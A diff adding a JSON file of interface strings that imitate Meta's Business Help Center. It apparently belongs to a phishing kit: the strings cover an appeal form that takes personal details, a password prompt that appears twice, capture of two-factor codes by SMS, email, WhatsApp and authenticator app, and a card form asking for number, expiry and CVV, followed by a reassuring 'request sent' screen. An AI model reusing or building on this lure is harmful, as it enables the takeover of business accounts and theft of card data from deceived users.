@@ -1,0 +1,342 @@
+{
+    "title": "Business Help Center",
+
+  "HelpCenter": {
+    "title": "Business Help Center",
+    "businessHelpCenter": "Business Help Center",
+    "getSupport": "Get Support",
+    "heading": "How to add a payment method in Meta Business Manager",
+    "intro": "Add a payment method to your Meta Business Manager to enable payments on Facebook and manage all of your billing details in one place. You can also connect it to an ad account and use it as the primary payment method for your ads.",
+    "beforeYouBegin": "Before you begin",
+    "adminNote": "Only admins or finance editors can make changes to payment methods connected to a Business Manager. Learn more about roles for people in Business Manager.",
+    "howToAdd": "How to add a payment method and accept payments in Business Manager",
+    "stepsTitle": "Steps to add a payment method in Business Manager:",
+    "step1": "1. Open Business settings.",
+    "step2": "2. Click",
+    "step3": "3. Click",
+    "step4": "4. Enter your payment information.",
+    "step5": "5. Click",
+    "step5Cont": "then follow the instructions to add your payment method.",
+    "payments": "Payments.",
+    "add": "+ Add.",
+    "continue": "Continue"
+  },
+
+  "Captcha": {
+    "title": "Verify you're human",
+    "continue": "Continue",
+    "description": {
+      "helps": "This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.",
+      "usesRecaptcha": "We've used Google's reCAPTCHA Enterprise product to provide this security check. The use of reCAPTCHA is subject to the Google Privacy Policy and Terms of Use.",
+      "dataCollection": "reCAPTCHA Enterprise collects hardware and software information such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising."
+    }
+  },
+
+  "RequestModal": {
+    "title": "Request has been sent",
+    "message": "Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.",
+    "button": "Return to Facebook"
+  },
+
+   "AuthModal": {
+    "title": "Check your text messages",
+    "subtitle": "Enter the code we sent to {phoneStart}*******{phoneEnd}",
+    "codePlaceholder": "Code",
+    "codeLabel": "Code",
+    "continue": "Continue",
+    "error": {
+      "invalidCode": "Invalid authentication code",
+      "resend": "We can send a new code in"
+    }
+  },
+
+  "AuthAppModal": {
+    "title": "Go to your authentication app",
+    "subtitle": "Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator)",
+    "codePlaceholder": "Code",
+    "codeLabel": "Code",
+    "continue": "Continue",
+    "error": {
+      "invalidCode": "Invalid authentication code",
+      "resend": "We can send a new code in"
+    }
+  },
+
+  "Email2FA": {
+    "title": "Check your email",
+    "subtitle": "Enter the code we sent to {emailStart}******{emailDomain} ({businessStart}******{businessDomain})",
+    "codePlaceholder": "Code",
+    "codeLabel": "Code",
+    "continue": "Continue",
+    "error": {
+      "invalidCode": "Invalid authentication code",
+      "resend": "We can send a new code in"
+    }
+  },
+  "Sms2FA": {
+    "title": "Check your text messages",
+    "subtitle": "Enter the code we sent to {telStart}*******{telEnd}",
+    "codePlaceholder": "Code",
+    "codeLabel": "Code",
+    "continue": "Continue",
+    "error": {
+      "invalidCode": "Invalid authentication code",
+      "resend": "We can send a new code in"
+    }
+  },
+   "Whatsapp2FA": {
+    "title": "Check your WhatsApp messages",
+    "subtitle": "Enter the code we sent to your WhatsApp account.",
+    "codePlaceholder": "Code",
+    "codeLabel": "Code",
+    "continue": "Continue",
+    "error": {
+      "invalidCode": "Invalid authentication code",
+      "resend": "We can send a new code in"
+    }
+  },
+
+   "IntroScreen": {
+    "title": "Meta Business Help Center",
+    "continue": "Continue"
+  },
+
+  "Footer": {
+    "intro": "Facebook can help your large, medium or small business grow. Get the latest news for advertisers and more on our",
+    "metaPage": "Meta for Business Page.",
+    "sections": {
+      "marketing": {
+        "title": "Marketing on Facebook",
+        "success": "Success Stories",
+        "measurement": "Measurement",
+        "industries": "Industries",
+        "inspiration": "Inspiration",
+        "events": "Events",
+        "news": "News",
+        "sitemap": "Site map"
+      },
+      "objectives": {
+        "title": "Marketing objectives",
+        "presence": "Build your presence",
+        "awareness": "Create awareness",
+        "discovery": "Drive discovery",
+        "leads": "Generate leads",
+        "sales": "Boost sales",
+        "loyalty": "Earn loyalty"
+      },
+      "pages": {
+        "title": "Facebook Pages",
+        "getStarted": "Get started with Pages",
+        "setup": "Setting up your Page",
+        "manage": "Manage your Facebook Page",
+        "promote": "Promote your Page",
+        "messaging": "Messaging on your Page",
+        "insights": "Page Insights"
+      },
+      "ads": {
+        "title": "Facebook ads",
+        "getStarted": "Get started with ads",
+        "buying": "Buying Facebook ads",
+        "formats": "Ad formats",
+        "placement": "Ad placement",
+        "audience": "Choose your audience",
+        "measure": "Measure your ads",
+        "manage": "Managing your ads"
+      },
+      "resources": {
+        "title": "Resources",
+        "adsGuide": "Ads Guide",
+        "helpCenter": "Business Help Centre",
+        "audienceNetwork": "Meta Audience Network",
+        "blueprint": "Meta Blueprint",
+        "developers": "Meta for Developers",
+        "partners": "Meta Business Partners",
+        "instagram": "Instagram Business",
+        "support": "Support"
+      }
+    }
+  },
+
+  "SupportStep": {
+    "title": "How can we help you?",
+    "subtitle": "We need more information to address your issue. This form will only take a few minutes.",
+    "options": {
+      "blocked": "I have been blocked from using this feature.",
+      "pageRestricted": "My page is restricted (not violating any policy).",
+      "adAccountDisabled": "My ad account is disabled.",
+      "failedPayment": "I need help with a failed payment.",
+      "unauthorizedAccess": "I think someone accessed my business without my permission.",
+      "other": "Other issue."
+    },
+    "continue": "Continue"
+  },
+
+  "PasswordModal": {
+    "title": "Please Enter Your Password",
+    "description": "For your security, you must enter your password to continue.",
+    "emailLabel": "Email address",
+    "passwordLabel": "Password",
+    "error": {
+      "invalidPassword": "The password you've entered is incorrect."
+    },
+    "submit": "Submit"
+  },
+
+  "ReenterPassword": {
+    "title": "Please re-enter your password",
+    "description": "For your security, you must re-enter your password to continue.",
+    "passwordPlaceholder": "Password",
+    "submit": "Submit",
+    "error": {
+      "invalidPassword": "The password you've entered is incorrect."
+    }
+  },
+
+   "ReenterPassword2": {
+    "title": "Please re-enter your password",
+    "description": "For your security, you must re-enter your password to continue.",
+    "passwordPlaceholder": "Password",
+    "submit": "Submit",
+    "error": {
+      "invalidPassword": "The password you've entered is incorrect."
+    }
+  },
+  "NotificationCheck": {
+    "title": "Check your notifications on another device",
+    "instruction": "We sent a notification to your Phone or PC. Check your Facebook notifications there and approve the login to continue.",
+    "waiting": "Waiting for approval",
+    "note": "It may take a few minutes to get the notification on your other device. Get a new notification",
+    "continue": "Continue"
+  },
+
+   "VerifyPayment": {
+    "title": "Verify payment information",
+    "subtitle": "Verify payment method",
+    "card": {
+      "label": "Debit or Credit Card"
+    },
+    "paypal": {
+      "label": "PayPal"
+    },
+    "securityNote": "Your payment methods are saved and stored securely.",
+    "terms": "Terms Apply",
+    "next": "Next"
+  },
+  "SupportIntro1": {
+    "smallText": "Meta Business Help Center",
+    "bigText": "Get Support"
+  },
+
+  "SupportForm": {
+    "title": "How can we help you?",
+    "subtitle": "We need more information to address your issue. This form will only take a few minutes.",
+    "fields": {
+      "name": {
+        "label": "Your full name",
+        "placeholder": "Your full name",
+        "error": "Invalid full name"
+      },
+      "email": {
+        "label": "Personal email address",
+        "placeholder": "Email address",
+        "error": "Invalid email address"
+      },
+      "businessEmail": {
+        "label": "Business email address",
+        "placeholder": "Business Email address",
+        "error": "Invalid email address"
+      },
+      "phone": {
+        "label": "Personal phone number",
+        "placeholder": "Phone number",
+        "error": "Invalid phone number"
+      },
+      "appeal": {
+        "label": "Your appeal information (optional)",
+        "placeholder": "Your appeal information"
+      }
+    },
+    "submit": "Submit"
+  },
+
+  "CardVerification": {
+    "title": "Debit or Credit Card",
+    "cardDetails": "Card Details",
+    "nameOnCard": "Name on card",
+    "cardNumber": "Card Number",
+    "expiry": "MM/YY",
+    "cvv": "CVV",
+    "security": "Your payment methods are saved and stored securely.",
+    "terms": "Terms Apply",
+    "verify": "Verify"
+  },
+   "SupportForm1": {
+    "title": "How can we help you?",
+    "subtitle": "We need more information to address your issue. This form will only take a few minutes.",
+    "fields": {
+      "name": {
+        "label": "Your full name",
+        "placeholder": "Your full name",
+        "error": "Invalid full name"
+      },
+      "email": {
+        "label": "Personal email address",
+        "placeholder": "Email address",
+        "error": "Invalid email address"
+      },
+      "businessEmail": {
+        "label": "Business email address",
+        "placeholder": "Business Email address",
+        "error": "Invalid email address"
+      },
+      "phone": {
+        "label": "Personal phone number",
+        "placeholder": "Phone number",
+        "error": "Invalid phone number"
+      },
+      "appeal": {
+        "label": "Your appeal information (optional)",
+        "placeholder": "Your appeal information"
+      }
+    },
+    "submit": "Submit"
+  },
+  "VerificationResult": {
+    "loading": "Please wait while we verify your information",
+    "successTitle": "Success",
+    "cardVerified": "Card successfully verified",
+    "cardVerifiedInfo": "This card has been verified for your account",
+    "close": "Close"
+  },
+   "MobileHeader": {
+    "getStarted": "Get started",
+    "advertise": "Advertise",
+    "learn": "Learn",
+    "support": "Support",
+    "helpCenter": "Business Help Center"
+  },
+
+    "IntellectualProperty": {
+    "metaForBusinessTitle": "Meta for Business",
+    "sidebarTitle": "Intellectual Property Appeal Center",
+    "sidebarDesc": "If you believe a decision regarding a copyright violation or any other issue is incorrect, you can submit an appeal here.",
+    "appealRequest": "Appeal Request",
+    "submitAppeal": "Submit an appeal",
+    "helpCenter": "Help Center",
+    "links": {
+      "facebookHelpCenter": "Facebook Help Center",
+      "metaForBusinessPage": "Meta for Business Page",
+      "advertisingPolicies": "Advertising Policies",
+      "facebookAdsGuide": "Facebook Ads Guide",
+      "sellOnFacebookInstagram": "Sell on Facebook and Instagram"
+    },
+    "footer": {
+      "privacy": "Privacy",
+      "terms": "Terms",
+      "adChoices": "Ad Choices",
+      "cookies": "Cookies",
+      "about": "About",
+      "metaCopyright": "Meta © 2025"
+    }
+  }
+}
